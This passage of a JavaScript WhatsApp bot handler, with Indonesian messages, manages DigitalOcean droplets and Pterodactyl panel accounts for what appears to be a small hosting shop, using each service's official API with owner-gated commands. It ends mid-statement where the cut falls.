case 'listdroplet': { 
    if (!isCreator) return Reply(mess.owner);

    try {
        // Ambil data droplets dari DigitalOcean API
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
            headers: { Authorization: "Bearer " + global.apiDigitalOcean }
        });

        const data = await response.json();
        const droplets = data.droplets || [];

        let totalvps = droplets.length;
        let totalActiveDroplets = droplets.filter(d => d.status === "active").length;
        let mesej = `🌐 *List Droplet Digital Ocean Kamu:* ${totalvps} 🔽\n\n`;

        if (totalvps === 0) {
            mesej += '⚠️ Tidak ada droplet yang tersedia!';
        } else {
            for (let droplet of droplets) {
                const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
                const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                
                mesej += `🖥️ *Droplet ID:* ${droplet.id}
📛 Hostname: ${droplet.name} 
👤 Username: Root 
🌍 IP: ${ipAddress} 
💾 RAM: ${droplet.memory} MB 
⚡ CPU: ${droplet.vcpus} CPU 
🖥️ OS: ${droplet.image.distribution} 
🗄️ Storage: ${droplet.disk} GB 
📌 Status: ${droplet.status.toUpperCase()}

────────────────────\n`; 
            }

            // Tambahkan total droplet aktif di bagian bawah
            mesej += `\n✅ *Total Droplet yang bisa dipakai:* ${totalActiveDroplets} dari ${totalvps}`;
        }

        // Kirim pesan dengan tombol "Buy VPS"
        await conn.sendMessage(m.chat, {
            text: mesej,
            footer: `© 2025 ${botname}`,
            headerType: 1,
            viewOnce: true,
            buttons: [
                { buttonId: `.buyvps`, buttonText: { displayText: 'Buy Vps' }, type: 1 }
            ],
            contextInfo: {
                isForwarded: true, 
                mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
            }
        }, { quoted: m });

    } catch (err) {
        m.reply('❌ Terjadi kesalahan saat mengambil data droplet: ' + err);
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
conn.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cvps": {
if (!text) return m.reply(example("hostname"))
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© WhatsApp Bots - 2025`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return Reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1500"
disknya = "0"
cpu = "100"
} else if (command == "2gb") {
ram = "2500"
disknya = "0"
cpu = "200"
} else if (command == "3gb") {
ram = "3500"
disknya = "0"
cpu = "300"
} else if (command == "4gb") {
ram = "4500"
disknya = "0"
cpu = "400"
} else if (command == "5gb") {
ram = "5500"
disknya = "0"
cpu = "500"
} else if (command == "6gb") {
ram = "6500"
disknya = "0"
cpu = "60"
} else if (command == "7gb") {
ram = "7500"
disknya = "0"
cpu = "700"
} else if (command == "8gb") {
ram = "8500"
disknya = "0"
cpu = "800"
} else if (command == "9gb") {
ram = "9500"
disknya = "0"
cpu = "900"
} else if (command == "10gb") {
ram = "15000"
disknya = "0"
cpu = "10000"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Garansi pembelian 30 hari (∞x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb2": case "2gb2": case "3gb2": case "4gb2": case "5gb2": case "6gb2": case "7gb2": case "8gb2": case "9gb2": case "10gb2": case "unlimited2": case "unli2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return Reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb2") {
ram = "1500"
disknya = "0"
cpu = "100"
} else if (command == "2gb2") {
ram = "2500"
disknya = "0"
cpu = "200"
} else if (command == "3gb2") {
ram = "3500"
disknya = "0"
cpu = "300"
} else if (command == "4gb2") {
ram = "4500"
disknya = "0"
cpu = "400"
} else if (command == "5gb2") {
ram = "5500"
disknya = "0"
cpu = "500"
} else if (command == "6gb2") {
ram = "6500"
disknya = "0"
cpu = "600"
} else if (command == "7gb2") {
ram = "7500"
disknya = "0"
cpu = "700"
} else if (command == "8gb2") {
ram = "8500"
disknya = "0"
cpu = "800"
} else if (command == "9gb2") {
ram = "9500"
disknya = "0"
cpu = "900"
} else if (command == "10gb2") {
ram = "15000"
disknya = "0"
cpu = "10000"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_21",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Garansi pembelian 30 hari (∞x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
var teks = " *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//==========𝐓𝐚𝐦𝐚==========//
case "listpanel2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: ` ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
if (!text) return m.reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.deladmin* 1"))
if (Number(text) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
indx = Number(args[0] - 1)
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
if (!args[1]) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply(`Tidak ada admin panel di server ${text}`)
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${text} ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: `List Admin Panel Server ${text}`, 
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[1] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}* di server panel ${args[0]}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© メミＸＹ𝕮𝖔𝖔𝖑𝔠𝔯𝔞𝔣𝔱ミ⁠メ || XYTeam Shop ID`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
